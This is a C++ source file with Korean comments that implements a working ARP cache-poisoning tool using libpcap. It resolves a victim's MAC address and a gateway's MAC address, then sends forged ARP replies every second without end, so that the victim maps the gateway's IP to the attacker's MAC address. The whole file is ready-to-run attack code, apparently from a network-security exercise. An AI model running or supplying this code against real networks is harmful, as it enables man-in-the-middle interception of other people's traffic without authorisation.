#include <iostream>
#include <pcap.h>
#include <cstring>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if_arp.h>

// ARP 헤더 구조체 정의
struct arp_header {
    uint16_t htype;     // Hardware Type
    uint16_t ptype;     // Protocol Type
    uint8_t hlen;       // Hardware Address Length
    uint8_t plen;       // Protocol Address Length
    uint16_t oper;      // Operation Code
    uint8_t sha[6];     // Sender hardware address
    uint8_t spa[4];     // Sender IP address
    uint8_t tha[6];     // Target hardware address
    uint8_t tpa[4];     // Target IP address
};

// 이더넷 헤더 구조체 정의
struct my_ether_header {
    uint8_t dest[6];    // Destination MAC address
    uint8_t src[6];     // Source MAC address
    uint16_t type;      // EtherType (ARP: 0x0806)
};

// MAC 주소를 가져오는 함수
void get_mac_address(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(1);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}

// ARP 패킷을 전송하는 함수
void send_arp_packet(pcap_t* handle, const uint8_t* sender_mac, const uint8_t* sender_ip, const uint8_t* target_mac, const uint8_t* target_ip, const uint8_t* attacker_mac) {
    uint8_t packet[42];

    struct my_ether_header* eth = (struct my_ether_header*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + 14);

    // 이더넷 헤더 설정
    memcpy(eth->dest, sender_mac, 6);
    memcpy(eth->src, attacker_mac, 6);
    eth->type = htons(0x0806); // ARP

    // ARP 헤더 설정
    arp->htype = htons(1);   // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6;           // MAC 주소 길이
    arp->plen = 4;           // IP 주소 길이
    arp->oper = htons(2);    // ARP Reply

    memcpy(arp->sha, attacker_mac, 6);   // Attacker's MAC
    memcpy(arp->spa, target_ip, 4);      // Target IP (Gateway IP)
    memcpy(arp->tha, sender_mac, 6);     // Victim's MAC
    memcpy(arp->tpa, sender_ip, 4);      // Victim's IP

    // 패킷 전송
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        std::cerr << "Error sending ARP packet: " << pcap_geterr(handle) << std::endl;
    }
}

void GetMACAddress(const char* ipAddress, uint8_t mac[6], const char* dev) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    struct sockaddr_in addr;
    struct arpreq req;

    memset(&req, 0, sizeof(req));
    memset(&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ipAddress);
    memcpy(&req.arp_pa, &addr, sizeof(addr));

    // 네트워크 인터페이스 이름을 dev 인자로 받음
    strncpy(req.arp_dev, dev, IFNAMSIZ - 1);
    req.arp_dev[IFNAMSIZ - 1] = '\0'; // 안전하게 문자열 종료

    if (ioctl(sockfd, SIOCGARP, &req) == -1) {
        perror("ioctl");
        close(sockfd);
        return;
    }

    // MAC 주소를 mac 배열에 복사
    memcpy(mac, req.arp_ha.sa_data, 6);

    close(sockfd);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <sender IP> <target IP>" << std::endl;
        return 1;
    }

    const char* dev = argv[1];
    const char* sender_ip_str = argv[2];
    const char* target_ip_str = argv[3];
    
    uint8_t attacker_mac[6];
    uint8_t sender_mac[6];
    uint8_t target_mac[6];
    
    uint8_t sender_ip[4];
    uint8_t target_ip[4];

    // MAC 주소 및 IP 주소를 가져옴
    get_mac_address(dev, attacker_mac);
    inet_pton(AF_INET, sender_ip_str, sender_ip);
    inet_pton(AF_INET, target_ip_str, target_ip);

    // pcap 세션 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        std::cerr << "pcap_open_live() failed: " << errbuf << std::endl;
        return 1;
    }

    GetMACAddress(target_ip_str, target_mac, dev);
    GetMACAddress(sender_ip_str, sender_mac, dev);
    
    // ARP 스푸핑 패킷을 지속적으로 전송
    while (true) {
        send_arp_packet(handle, sender_mac, sender_ip, target_mac, target_ip, attacker_mac);
        sleep(1); // 1초마다 패킷 전송
    }

    pcap_close(handle);
    return 0;
}
